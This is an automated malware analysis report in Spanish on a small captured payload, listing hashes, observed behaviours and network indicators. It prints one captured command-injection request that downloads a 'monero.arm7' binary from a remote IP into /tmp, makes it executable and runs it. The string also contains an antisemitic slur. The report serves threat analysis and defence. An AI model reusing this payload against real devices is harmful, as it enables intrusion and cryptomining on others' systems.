# 🧬 Payload Analysis

`b56c539869fdf0eaae6831b7f05050b50f36e466d5a8bbec36600e0d17673a99`

## 📌 Resumen

Artefacto de 507 B. Formato identificado como ASCII text, with CRLF line terminators. Entropía registrada: 5.35. No existe evidencia suficiente para atribuir este artefacto a una familia concreta. Comportamientos destacados: Descarga remota, Cambio de permisos, Limpieza. Se identificó 1 comando observado o extraído. Se identificaron 4 indicadores técnicos.


## 🏷️ Clasificación

- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T20:17:11.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `b56c539869fdf0eaae6831b7f05050b50f36e466d5a8bbec36600e0d17673a99`
- **SHA1:** `15ef71c3aff0ff04ac0f78c3a621874c6b0f0ee0`
- **MD5:** `e624c6ee9ce68ad81315e62f17bb824d`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 507 B |
| Entropía | 5.35 |
| Strings | 8 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Cambio de permisos**
3. **Limpieza**

## 🔬 Evidencia de clasificación

- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=4

## 🖥️ Comandos observados / extraídos

```text
GET /shell?cd+/tmp;rm+arm+arm7;wget+http:/\/31.56.209.XXX/monero.arm7;chmod+777+monero.arm7;./monero.arm7+jews;wget+http:
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| ip | 31.56.209.XXX | static_analysis |
| ip | 190.179.128.XXX | static_analysis |
| command | GET /shell?cd+/tmp;rm+arm+arm7;wget+http:/\/31.56.209.XXX/monero.arm7;chmod+777+monero.arm7;./monero.arm7+jews;wget+http: | strings |
| hash | b56c539869fdf0eaae6831b7f05050b50f36e466d5a8bbec36600e0d17673a99 | static_analysis |
| ip | 176.65.139.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | low interest unknown |
| Prioridad | low |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
